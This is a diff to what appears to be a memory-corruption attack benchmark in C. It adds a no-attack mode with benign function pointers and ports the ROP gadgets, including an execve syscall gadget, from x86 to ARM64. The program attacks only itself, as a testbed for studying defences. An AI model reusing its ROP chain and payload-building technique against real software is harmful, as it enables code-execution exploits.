@@ -77,6 +77,13 @@ static char* executable_path;
 static boolean output_debug_info = FALSE;
 static boolean output_error_msg = TRUE;
 
+static boolean no_attack = FALSE;
+
+int foo(const char* x) {
+	printf("%s\n", x);
+	return 0;
+}
+
 int main(int argc, char **argv) {
   int option_char, i;
   // make the stack size not computable to make compiler use leave for base pointer attacks
@@ -93,7 +100,7 @@ int main(int argc, char **argv) {
 
   // set the global var attack
   executable_path = argv[0];
-  while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
+  while((option_char = getopt(argc, argv, "t:i:c:l:f:n:d:e:o")) != -1) {
     switch(option_char) {
       case 't':
         set_technique(optarg);
@@ -110,6 +117,9 @@ int main(int argc, char **argv) {
       case 'f':
         set_function(optarg);
         break;
+      case 'n': // no attack
+	no_attack = TRUE;
+	break;
       case 'd':
         if (strcmp("t", optarg) == 0) {
           output_debug_info = TRUE;
@@ -631,6 +641,18 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
   /* start filling the buffer from that first byte                        */
   buffer[0] = '\0';
 
+  // MENI change: setup default benign behavior
+  bss_func_ptr = &foo;
+  stack_func_ptr = &foo;
+  stack_func_ptr_param = &foo;
+  stack_struct.func_ptr = &foo;
+  heap_func_ptr = &foo;
+  heap_struct->func_ptr = &foo;
+  bss_func_ptr = &foo;
+  bss_struct.func_ptr = &foo;
+  data_func_ptr = &foo;
+  data_struct.func_ptr = &foo;
+
   /*****************/
   /* Build payload */
   /*****************/
@@ -647,6 +669,10 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
   attack_on_bss_func_ptr = (attack.code_ptr == FUNC_PTR_BSS);
 
   locate_terminating_chars(payload.buffer, payload.size);
+
+  if (no_attack) {
+	  payload.size = 1;
+  }
 
   /****************************************/
   /* Overflow buffer with chosen function */
@@ -705,6 +731,7 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
 
   if (attack.technique == INDIRECT) {
     if (attack.code_ptr == OLD_BASE_PTR) {
+	    if(!no_attack) 
       // Point to the old base pointer of the fake stack frame
       *(uintptr_t *)(*(uintptr_t *)target_addr) =
         (uintptr_t)(buffer + payload.size - // end of buffer
@@ -921,6 +948,8 @@ boolean build_payload(CHARPAYLOAD *payload) {
       (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
       (uintptr_t)&exit};
 
+    fprintf(stderr,"temp 0x%lx\n", (uintptr_t)temp_char_ptr);
+
     payload->size += 4*sizeof(uintptr_t);
     temp_char_buffer = (char *)malloc(payload->size);
     memcpy(temp_char_buffer, payload->buffer, payload->size);
@@ -996,9 +1025,12 @@ boolean build_payload(CHARPAYLOAD *payload) {
       uintptr_t rop_sled[] = {
         (uintptr_t)&gadget1 + find_gadget_offset(search_chars1),
         (uintptr_t)temp_char_ptr,
+        (uintptr_t)&exit,
         (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
         (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
         (uintptr_t)&exit};
+
+      fprintf(stderr,"temp 0x%lx\n", (uintptr_t)temp_char_ptr);
 
       memcpy(&(payload->buffer[payload->size -
             sizeof(char) -
@@ -1694,46 +1726,73 @@ int find_gadget_offset(char* search_chars){
 
 // Dummy functions used to create gadgets for the ROP attack
 void gadget1(int a, int b){
+	/*
   int arthur,dent,j;
   arthur = a + b / 42;
 
   char buffer[256];
   for(j=0;j<10;j++);
+  */
   __asm__(
-      "mov $0x3b, %rax\n"
+	"sub sp, sp, #0x170;\n"
+	"mov x1, #0;\n"
+        "ldp x29, x30, [sp], #0x10;\n"
+        "ret"
+	);
+  /*
+  __asm__(
+      "mov $0x3b, x1\n"		  
       "pop %rdi;\n"
       "ret"
       );
+      */
 
   return;
 }
 
 void gadget2(int a, int b){
+	/*
   int ford,prefect,j;
   ford = a + b / 43;
   for(j=0;j<10;j++);
+  */
+  __asm__(
+      "add sp, sp, #0x10;\n"
+      "mov x1, #0;\n"
+      "mov x2, #0;\n"
+      "ldp x29, x30, [sp], #0x10;\n"
+      "ret"
+      );
+  /*
   __asm__(
       "mov $0, %rsi\n"
       "mov $0, %rdx\n"
       "ret");
+      */
 
   return;
 }
 
 int gadget3(int a, int b){
+	/*
   int i,j;
   i = a + b / 33;
 
   for(j=0;j<10;j++);
-  __asm__("syscall");
+  */
+  __asm__("svc #0");
+ // __asm__("syscall");
   return 42;
 }
 
 void gadget4(int a, int b){
+	/*
   int i,j;
   i = a + 4*b / 12;
 
   for(j=0;j<5;j++);
-  __asm__("nop; pop %rdi; ret;");
+  */
+  __asm__("nop; ldp x19, x20, [sp], #0x10; ret;");
+//  __asm__("nop; pop %rdi; ret;");
   return;
 }
